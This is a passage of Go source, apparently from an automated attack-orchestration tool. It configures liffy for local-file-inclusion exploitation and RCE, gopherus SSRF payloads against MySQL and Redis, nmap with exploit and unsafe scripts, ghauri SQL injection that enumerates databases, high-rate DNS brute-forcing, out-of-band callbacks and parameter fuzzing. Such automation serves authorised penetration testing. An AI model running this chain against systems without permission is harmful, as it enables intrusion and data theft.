		InstallHint: "git clone https://github.com/mzfr/liffy /opt/liffy && pip3 install -r /opt/liffy/requirements.txt --break-system-packages && sudo tee /usr/local/bin/liffy > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/liffy/liffy.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/liffy",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"-c",          // check for LFI
				"-e",          // exploit
				"--rce",       // try RCE via LFI
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "-c"}
			},
		},
	},

	// ── NEW 2025: gopherus — SSRF payload generator for internal services ──
	{
		Name:        "gopherus",
		Phase:       5,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "git clone https://github.com/tarunkant/Gopherus /opt/gopherus && pip3 install -r /opt/gopherus/requirements.txt --break-system-packages && sudo tee /usr/local/bin/gopherus > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/gopherus/gopherus.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/gopherus",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Generate SSRF payloads for common internal services
			return []string{"--exploit", "mysql"}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"--exploit", "redis"}
			},
		},
	},

	// ══════════════════════════════════════════════════════════════════════════
	// PHASE 6 — NETWORK VULNERABILITY SCRIPTS
	// Goal: network-level CVEs — Heartbleed, SMB vulns, SSL issues, auth bypass
	// ══════════════════════════════════════════════════════════════════════════

	{
		Name:        "nmap",
		Phase:       6,
		Timeout:     3600,
		DomainOnly:  false,
		InstallHint: "sudo apt install nmap",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			args := []string{
				"-sV",
				"--script", "vuln,exploit,auth,http-vuln*,ssl-heartbleed,ssl-enum-ciphers,smb-vuln*,dns-zone-transfer,ftp-anon,smtp-vuln*",
				"--script-args", fmt.Sprintf("unsafe=1,smbsecuritymode=1,vulns.showall"),
				"-Pn", "--open", "-T4",
				"--version-intensity", "9",
				"-oA", "/tmp/cybermind_nmap_hunt",
			}
			if len(ctx.OpenPorts) > 0 {
				ports := make([]string, len(ctx.OpenPorts))
				for i, p := range ctx.OpenPorts {
					ports[i] = fmt.Sprintf("%d", p)
				}
				args = append(args, "-p", strings.Join(ports, ","))
			} else {
				args = append(args, "--top-ports", "5000")
			}
			args = append(args, target)
			return args
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-sV", "--script", "vuln", "-Pn", "--open", "--top-ports", "1000", target}
			},
		},
	},

	// ── 2025 NEW: ghauri — advanced SQL injection tool (better than sqlmap) ──
	// Supports: error-based, time-based, boolean-based, UNION, stacked queries
	// Faster and more accurate than sqlmap for modern apps
	{
		Name:        "ghauri",
		Phase:       5,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "pip3 install ghauri --break-system-packages",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			// Find URLs with parameters for SQL injection testing
			var sqlURLs []string
			for _, u := range append(ctx.AllURLs, ctx.LiveURLs...) {
				if strings.Contains(u, "=") {
					sqlURLs = append(sqlURLs, u)
				}
			}
			if len(sqlURLs) > 0 {
				f := writeTempList(sqlURLs)
				if f != "" {
					return []string{
						"-m", f,
						"--level", "3",
						"--threads", "10",
						"--batch",
						"--dbs",
						"--random-agent",
						"--output-dir", "/tmp/cybermind_ghauri/",
					}
				}
			}
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-u", u,
				"--level", "3",
				"--threads", "10",
				"--batch",
				"--dbs",
				"--random-agent",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "--level", "1", "--batch", "--random-agent"}
			},
		},
	},

	// ── 2025 NEW: puredns — fast DNS brute-force with wildcard filtering ──
	// 10x faster than dnsx for brute-force, handles wildcards correctly
	{
		Name:        "puredns",
		Phase:       2,
		Timeout:     1800,
		DomainOnly:  true,
		InstallHint: "go install github.com/d3mondev/puredns/v2@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			wordlist := "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
			if _, err := os.Stat(wordlist); err != nil {
				wordlist = "/usr/share/wordlists/dirb/common.txt"
			}
			return []string{
				"bruteforce", wordlist, target,
				"--resolvers", "/tmp/cybermind_resolvers.txt",
				"--rate-limit", "10000",
				"--wildcard-tests", "5",
				"--wildcard-batch", "1000000",
				"-q",
				"--write", "/tmp/cybermind_puredns.txt",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				wordlist := "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
				if _, err := os.Stat(wordlist); err != nil {
					wordlist = "/usr/share/wordlists/dirb/common.txt"
				}
				return []string{"bruteforce", wordlist, target, "--rate-limit", "1000", "-q"}
			},
		},
	},

	// ── 2025 NEW: interactsh-client — OOB/blind vulnerability detection ──
	// Detects: blind SSRF, blind XSS, blind SQLi, blind RCE, blind XXE
	// Uses projectdiscovery's interactsh server for callback detection
	{
		Name:        "interactsh-client",
		Phase:       5,
		Timeout:     300,
		DomainOnly:  true,
		InstallHint: "go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			return []string{
				"-server", "oast.pro",
				"-n", "5",
				"-poll-interval", "5",
				"-json",
				"-o", "/tmp/cybermind_interactsh.json",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				return []string{"-n", "3", "-poll-interval", "10"}
			},
		},
	},

	// ── 2025 NEW: ffuf (param fuzzing mode) — hidden parameter discovery ──
	// Different from recon ffuf — this one fuzzes parameters, not paths
	{
		Name:        "ffuf-param",
		Phase:       3,
		Timeout:     3600,
		DomainOnly:  true,
		InstallHint: "sudo apt install ffuf",
		BuildArgs: func(target string, ctx *HuntContext) []string {
			u := target
			if len(ctx.LiveURLs) > 0 {
				u = ctx.LiveURLs[0]
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			// Fuzz GET parameters
			paramWordlist := "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
			if _, err := os.Stat(paramWordlist); err != nil {
				paramWordlist = "/usr/share/wordlists/dirb/common.txt"
			}
			return []string{
				"-w", paramWordlist,
				"-u", u + "?FUZZ=cybermind_test",
				"-t", "200",
				"-ac",
				"-mc", "200,201,204,301,302,307,401,403",
				"-fc", "404",
				"-o", "/tmp/cybermind_ffuf_params.json",
				"-of", "json",
				"-silent",
			}
		},
		FallbackArgs: []func(target string, ctx *HuntContext) []string{
			func(target string, ctx *HuntContext) []string {
				u := target
				if len(ctx.LiveURLs) > 0 {
					u = ctx.LiveURLs[0]
				}
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{
					"-w", "/usr/share/wordlists/dirb/common.txt",
					"-u", u + "?FUZZ=test",
					"-t", "100", "-ac", "-silent",
				}
			},
		},
	},
}
